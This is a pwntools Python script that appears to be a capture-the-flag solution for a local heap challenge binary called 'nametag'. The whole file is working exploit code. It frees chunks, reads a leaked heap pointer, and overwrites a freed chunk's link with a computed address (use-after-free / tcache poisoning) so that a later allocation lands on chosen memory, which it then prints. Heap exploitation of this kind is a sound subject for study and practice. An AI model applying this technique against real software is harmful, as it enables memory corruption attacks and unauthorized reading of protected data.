#!/usr/bin/env python3
from pwn import *

exe = context.binary = ELF(args.EXE or './nametag')
libc = ELF(exe.libc.path)

def add(idx):
    io.sendlineafter(b"> ", b"1")
    io.sendlineafter(b": ", str(idx).encode())

def edit(idx, name):
    io.sendlineafter(b"> ", b"2")
    io.sendlineafter(b": ", str(idx).encode())
    io.sendlineafter(b": ", name)

def delete(idx):
    io.sendlineafter(b"> ", b"3")
    io.sendlineafter(b": ", str(idx).encode())

def show(idx):
    io.sendlineafter(b"> ", b"4")
    io.sendlineafter(b": ", str(idx).encode())
    io.recvuntil(b"Name: ")
    return io.recvline().strip()

io = process(exe.path)

for i in range(3): add(i)

delete(1)
delete(0)

edit(0, p64(u64(show(0)[0:6].ljust(8, b'\x00'))-160-0x10))

add(0)
add(0)

print(show(0).replace(b'\x00', b'').decode())
